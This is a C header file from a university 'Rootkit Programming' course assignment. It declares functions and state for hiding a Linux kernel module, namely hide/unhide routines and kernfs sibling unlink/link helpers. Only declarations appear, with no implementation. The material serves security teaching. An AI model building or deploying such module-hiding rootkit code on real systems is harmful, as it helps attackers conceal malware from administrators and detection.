
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 5                                                             */
/*                                                                             */
/*   Filename: module_masker.h                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: Header file for kernel module `module_masker.c`.                   */
/*                                                                             */
/*******************************************************************************/

#ifndef __MODULE_MASKING__
#define __MODULE_MASKING__


static int module_is_hidden;	/* Current state of module (1 ~> hidden) */
static struct list_head *module_prev;

/* Declaration of functions */
void hide_module(void);
void unhide_module(void);

/* Implementation of functions below is taken from fs/kernfs/dir.c, lines 224-321 */
static bool kernfs_unlink_sibling(struct kernfs_node *kn);
static int kernfs_link_sibling(struct kernfs_node *kn);

#endif
